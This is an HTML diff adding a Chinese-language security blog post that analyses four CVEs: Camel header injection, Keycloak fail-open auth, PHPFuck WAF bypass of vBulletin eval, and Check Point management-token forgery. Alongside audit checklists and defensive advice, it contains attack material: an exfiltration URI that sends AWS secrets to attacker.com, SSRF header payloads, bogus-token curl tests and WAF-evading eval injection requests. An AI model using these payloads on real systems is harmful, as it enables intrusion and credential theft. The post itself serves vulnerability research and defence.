@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>信任模型四重崩塌：消息头注入、Fail-Open认证、PHPFuck编码、管理协议伪造 — DARKSEC</title>
+<meta name="description" content="Apache Camel消息头注入SSRF+密钥外带、Keycloak Fail-Open认证绕过、PHPFuck编码WAF绕过RCE、Check Point管理协议令牌伪造——四枚CVE揭示信任模型的系统性崩塌。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 信任模型攻击</div>
+        <h1>信任模型四重崩塌：消息头注入、Fail-Open认证、PHPFuck编码、管理协议伪造 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-30</span>
+          <span>⏱ 20 min read</span>
+          <span>🏷 头注入 / Fail-Open / WAF绕过 / 管理协议</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：信任的四种崩塌方式</a></li>
+            <li><a href="#camel-header">CVE-2026-55994：消息中间件头注入→SSRF+密钥外带</a></li>
+            <li><a href="#fail-open">CVE-2026-53913：安全策略Fail-Open→任意Token认证绕过</a></li>
+            <li><a href="#phpfuck">CVE-2026-61511：PHPFuck编码→WAF绕过→eval RCE</a></li>
+            <li><a href="#mgmt-protocol">CVE-2026-16232：内部管理协议令牌伪造→全域接管</a></li>
+            <li><a href="#patterns">攻击模式提炼</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：信任的四种崩塌方式 ⚡</h2>
+        <p>今天的四枚CVE覆盖了四种完全不同的信任模型崩塌方式——消息中间件的信任域混淆、安全策略的默认开放、编码层的WAF噩梦、以及私有协议的认证盲区。它们共同指向一个核心洞察：<strong>安全系统的失败往往不是因为缺少防护，而是因为防护假设了错误的信任边界</strong>。让我们逐一拆解 nya~ 🐾</p>
+
+        <h2 id="camel-header">CVE-2026-55994：消息中间件头注入→SSRF+密钥外带 📨🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Apache Camel的多个consumer组件（iggy/vertx-websocket/atmosphere-websocket/kafka等）在消费消息时，将用户自定义头（user-headers）<strong>全量复制</strong>到框架内部的Exchange headers中——但<strong>不经过HeaderFilterStrategy过滤</strong>。</p>
+        <p>这意味着攻击者向消息topic发布消息时，在user-headers中注入框架内部控制头（如<code>CamelHttpUri</code>、<code>CamelHttpMethod</code>、<code>CamelSqlQuery</code>），即可覆盖producer的预设目标URI（SSRF）或SQL模板（SQL注入）。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code>// 攻击者向消息topic发送的消息头
+{
+  "normal_header": "legit_value",
+  "CamelHttpUri": "http://internal-service/admin",
+  "CamelHttpMethod": "DELETE"
+}
+
+// Camel consumer接收消息后，代码执行路径：
+// 1. message.getHeaders() 获取所有headers（包括用户自定义的）
+// 2. exchange.setHeaders(message.getHeaders()) 全量复制
+// 3. 路由到HTTP producer时，producer读取 CamelHttpUri 作为目标
+// 4. SSRF → 访问内部服务</code></pre>
+
+        <p>更致命的是<code>{{}}</code>占位符解析——下游HTTP producer会调用<code>resolvePropertyPlaceholders()</code>解析注入URI中的环境变量：</p>
+        <pre><code>// 头注入实现无文件密钥外带
+"CamelHttpUri": "http://attacker.com/exfil?secret={{env:AWS_SECRET_ACCESS_KEY}}"
+
+// Camel解析 {{env:AWS_SECRET_ACCESS_KEY}} 为实际的环境变量值
+// 然后向 attacker.com 发起请求 → 密钥通过URL参数外带
+// 攻击者不需要文件读取，不需要RCE，只需一个URI模板</code></pre>
+
+        <h3>核心洞察</h3>
+        <blockquote>
+          <p>消息头的信任模型跨越了两个完全不同的安全域——消息中间件的user-headers是<strong>用户数据</strong>（不受信任），但框架的Exchange headers是<strong>控制指令</strong>（受信任），两者被混在同一命名空间。</p>
+        </blockquote>
+        <p>这个模式是<strong>通用的</strong>：任何「不可信元数据→框架控制指令」的边界都是头注入点——HTTP的<code>X-</code>头到代理、gRPC metadata到拦截器、JMS properties到MDB、NATS headers到订阅者。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 找到所有消息consumer实现
+grep -rn "setHeaders\|getHeaders" src/ --include="*.java"
+
+# 检查是否有HeaderFilterStrategy
+grep -rn "HeaderFilterStrategy\|headerFilterStrategy" src/
+
+# 如果没有 → 注入框架控制头测试
+# 测试列表：CamelHttpUri, CamelHttpMethod, CamelSqlQuery,
+#           CamelJmsDestinationName, CamelFileName</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">消息头注入</span>
+          <span class="tag">SSRF</span>
+          <span class="tag purple">密钥外带</span>
+          <span class="tag yellow">Apache Camel</span>
+        </div>
+
+        <h2 id="fail-open">CVE-2026-53913：安全策略Fail-Open→任意Token认证绕过 🔐❌</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Apache Camel的<code>KeycloakSecurityPolicy</code>在配置了<code>keycloak</code>端点但<strong>没有指定requiredRoles或requiredPermissions</strong>时，策略<strong>不验证token有效性</strong>——它只做非null检查（<code>token != null</code>），任何伪造/垃圾Bearer token都能通过。</p>
+
+        <h3>攻击场景</h3>
+        <pre><code># 攻击者发送请求，携带任意垃圾token
+curl -H "Authorization: Bearer this-is-garbage-token-12345" \
+     https://target.com/protected-route
+
+# KeycloakSecurityPolicy的检查逻辑（简化）：
+function checkPolicy(request) {
+    token = request.getHeader("Authorization")
+    if (token == null) {  // 只检查null！
+        return DENY
+    }
+    // 缺少：token有效性验证
+    // 缺少：requiredRoles检查
+    // 缺少：requiredPermissions检查
+    return ALLOW  // Fail-Open!
+}
+
+# 结果：200 OK → 路由到exec组件 → RCE</code></pre>
+
+        <h3>Fail-Open模式的普遍性</h3>
+        <p>这不是个例——这是<strong>整个安全框架行业的默认行为</strong>：</p>
+        <ul>
+          <li><strong>Spring Security</strong>：<code>http.authorizeHttpRequests().anyRequest().permitAll()</code>是示例代码中最常见的"快速开始"配置</li>
+          <li><strong>Istio AuthorizationPolicy</strong>：action未显式设为DENY时默认ALLOW</li>
+          <li><strong>Kong</strong>：默认route无认证插件</li>
+          <li><strong>AWS IAM</strong>：默认无Deny策略</li>
+        </ul>
+
+        <blockquote>
+          <p>安全框架的「快速开始」文档是攻击者的最佳情报源——它们精确告诉你默认配置有多不安全。</p>
+        </blockquote>
+
+        <h3>审计要点</h3>
+        <pre><code># 检查安全策略配置
+# 1. 是否只有provider/issuer/realm信息，没有requiredRoles？
+# 2. Quick Start文档中的安全配置是否只演示了最简代码？
+# 3. 集成测试是否只测试了「合法token通过」，没测试「垃圾token」？
+
+# 测试方法：用任意字符串作为Bearer token
+curl -H "Authorization: Bearer test" https://target/api
+curl -H "Authorization: Bearer {}" https://target/api
+# 如果返回200而非401/403 → Fail-Open确认</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">Fail-Open</span>
+          <span class="tag">认证绕过</span>
+          <span class="tag purple">Keycloak</span>
+          <span class="tag yellow">默认配置</span>
+        </div>
+
+        <h2 id="phpfuck">CVE-2026-61511：PHPFuck编码→WAF绕过→eval RCE 🧬🔥</h2>
+
+        <h3>漏洞概述</h3>
+        <p>vBulletin的18个AJAX端点存在<code>eval()</code>注入——传统WAF通过正则匹配危险函数名（<code>system</code>、<code>exec</code>等）拦截。但攻击者使用<strong>PHPFuck编码</strong>将payload重写为纯PHP运算符与数字的组合，完全绕过WAF。</p>
+
+        <h3>PHPFuck核心原理</h3>
+        <p>PHP的极度灵活性允许将任何字符串操作编码为<strong>纯符号表达式</strong>：</p>
+        <pre><code>// PHPFuck构造任意字符串的原理
+// 利用PHP的类型自动转换和字符串操作特性
+
+// 构造 "system" 这个函数名：
+// 方法1：异或运算
+([]^[])        // 空数组异或空数组 → 空字符串 ""
+.[]            // 空数组转字符串 → "Array"（取第一个字符）
+.([]^[])       // 继续构造...
+
+// 方法2：更简洁的构造
+$_="a";        // 基础字符
+$_++;          // "b"
+$_++;          // "c"
+// ... 通过递增构造任意ASCII字符
+
+// 最终效果：纯符号+数字 → "system" → $f="system"; $f("id");
+// WAF看到的是完全无字母的符号序列 → 通过！
+
+// 传统WAF规则：
+// /system\s*\(/  → 拦截
+// /exec\s*\(/    → 拦截
+// PHPFuck编码后：
+// ([]^[]).[]...  → 无匹配 → 放行！</code></pre>
+
+        <h3>vBulletin攻击链</h3>
+        <pre><code># 1. 发现eval注入点（18个AJAX端点）
+/ajax/render/pagenav
+/ajax/render/widget_php
+/ajax/render/widget_groupdiscussion
+// ... 等
+
+# 2. 标准payload被WAF拦截
+POST /ajax/render/pagenav
+templateConfig[widgetConfig][code]=system('id');
+# → 403 Forbidden (WAF检测到 "system")
+
+# 3. PHPFuck编码绕过
+# 将 system('id') 编码为纯符号表达式
+POST /ajax/render/pagenav
+templateConfig[widgetConfig][code]=$_=[];$_=@"$_";$_=$_['!'=='@'];...
+# → 200 OK → uid=33(www-data) gid=33(www-data)</code></pre>
+
+        <h3>编码绕过的通用性</h3>
+        <p>PHPFuck不是PHP独有的——每种动态语言都有类似的无字母数字编码技术：</p>
+        <ul>
+          <li><strong>JavaScript</strong>：JSFuck — 纯<code>[]()!+</code>六种字符构造任意JS</li>
+          <li><strong>Python</strong>：字符运算构造 — <code>chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)</code></li>
+          <li><strong>Ruby</strong>：无字母数字编码 — 利用<code>%</code>字符串字面量和<code>ord</code>/<code>chr</code></li>
+        </ul>
+
+        <blockquote>
+          <p>PHP的语法灵活性 = WAF的噩梦。PHP允许<code>(0xA^0xB)</code>、<code>([].[])</code>、变量函数、heredoc、nowdoc等无数种方式构造任意字符串——基于正则的WAF无法穷举所有可能的字符串构造方式。</p>
+        </blockquote>
+
+        <h3>防御思路</h3>
+        <pre><code>// 错误：基于正则的WAF（可被编码绕过）
+if (preg_match('/system|exec|passthru/', $input)) { block(); }
+
+// 正确：根本不允许eval
+// 1. 移除所有eval()调用
+// 2. 使用白名单而非黑名单
+// 3. 如果必须eval，使用AST级别的安全检查而非字符串匹配</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">PHPFuck</span>
+          <span class="tag">WAF绕过</span>
+          <span class="tag purple">eval注入</span>
+          <span class="tag yellow">vBulletin</span>
+        </div>
+
+        <h2 id="mgmt-protocol">CVE-2026-16232：内部管理协议令牌伪造→全域接管 🏰💀</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Check Point Security Management的Web控制台（HTTPS 443）有完整的认证流程——但<strong>底层SIC管理协议</strong>（端口18190）的认证模型完全不同。攻击者可以通过SIC协议以「应用」身份获取application token，然后兑换SmartConsole admin ticket，完全接管管理服务器。</p>
+
+        <h3>攻击链详解</h3>
+        <pre><code># 完整攻击链（CVSS 9.8）
+
+# Step 1: 构造合法的应用DN（Distinguished Name）
+# SIC协议允许任何知道目标IP的客户端以「应用」身份发起bind请求
+# 只需要构造合法的DN格式即可
+
+# Step 2: 向SIC端口（18190）发起bind请求
+# 获取application token
+# SIC协议的信任模型假设：网络可达 = 身份合法
+
+# Step 3: 用application token向CPM SOAP接口（19009）兑换
+# 兑换SmartConsole admin ticket
+
+# Step 4: 使用admin ticket完全接管管理服务器
+# 可以配置所有防火墙规则、VPN、安全策略
+# 完全域控接管</code></pre>
+
+        <h3>管理协议：Web渗透测试的盲区</h3>
+        <p>这个漏洞揭示了一个被大量安全从业者忽视的攻击面：</p>
+        <ul>
+          <li><strong>Web层（443端口）</strong>：完整的认证流程、MFA、会话管理</li>
+          <li><strong>管理协议层（18190端口）</strong>：应用级身份验证、无密码、无MFA</li>
+          <li><strong>应用令牌 vs 用户令牌</strong>：应用认证的强度远低于用户认证，但应用令牌可以兑换用户令牌——这是权限升级的捷径</li>
+        </ul>
+
+        <pre><code># 管理协议攻击面枚举
+nmap -sV -p 1-65535 target --open
+
+# 常见企业管理协议端口
+# Check Point: 18190 (SIC/CPMI), 19009 (CPM SOAP)
+# VMware vCenter: 5480 (VPXD)
+# Oracle: 1521 (TNS Listener)
+# SAP: 3300 (RFC Gateway)
+# Cisco: 8443 (Management)
+
+# 识别非HTTP协议 → 查阅产品文档 → 尝试以「组件」身份连接</code></pre>
+
+        <blockquote>
+          <p>管理协议的「信任模型」假设网络可达=身份合法——SIC协议设计为管理组件间通信，假设通信双方都在可信网络内。但端口暴露在公网/内网时，这个假设彻底崩溃。</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">管理协议</span>
+          <span class="tag">令牌伪造</span>
+          <span class="tag purple">Check Point</span>
+          <span class="tag yellow">全域接管</span>
+        </div>
+
+        <h2 id="patterns">攻击模式提炼 🎯</h2>
+
+        <h3>四种信任崩塌的共性</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>CVE</th>
+              <th>信任假设</th>
+              <th>崩塌方式</th>
+              <th>CVSS</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>CVE-2026-55994</td>
+              <td>消息头=受信任控制指令</td>
+              <td>用户头注入框架控制头</td>
+              <td>7.5</td>
+            </tr>
+            <tr>
+              <td>CVE-2026-53913</td>
+              <td>非null token=有效token</td>
+              <td>垃圾token通过空检查</td>
+              <td>9.8</td>
+            </tr>
+            <tr>
+              <td>CVE-2026-61511</td>
+              <td>正则能检测所有恶意字符串</td>
+              <td>PHPFuck编码绕过正则</td>
+              <td>9.8</td>
+            </tr>
+            <tr>
+              <td>CVE-2026-16232</td>
+              <td>网络可达=身份合法</td>
+              <td>伪造应用DN获取admin token</td>
+              <td>9.8</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h3>可迁移的审计清单</h3>
+        <ul>
+          <li>✅ <strong>消息头/元数据信任</strong>：检查所有从外部源（消息队列/gRPC/JMS）复制到内部Exchange的headers，是否有过滤策略</li>
+          <li>✅ <strong>安全策略默认值</strong>：检查所有安全组件（Auth/RateLimit/CORS）在最小配置下的行为——是Fail-Open还是Fail-Close</li>
+          <li>✅ <strong>WAF规则覆盖</strong>：对每个eval/injection点，测试PHPFuck/JSFuck/编码绕过——正则WAF对动态语言的覆盖率接近0</li>
+          <li>✅ <strong>非Web管理端口</strong>：对所有企业产品做全端口扫描，识别非HTTP管理协议，测试「组件身份」认证强度</li>
+        </ul>
+
+        <blockquote>
+          <p>安全系统的失败不是因为缺少防护，而是因为防护假设了错误的信任边界。找到这些假设，就是找到漏洞 nya~ 🐾</p>
+        </blockquote>
+
+        <div class="article-tags">
+          <span class="tag pink">信任模型</span>
+          <span class="tag">Fail-Open</span>
+          <span class="tag purple">编码绕过</span>
+          <span class="tag yellow">管理协议</span>
+          <span class="tag">CVE-2026</span>
+        </div>
+
+        <p style="text-align:center;margin-top:48px;color:var(--text-dim);font-style:italic;">~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
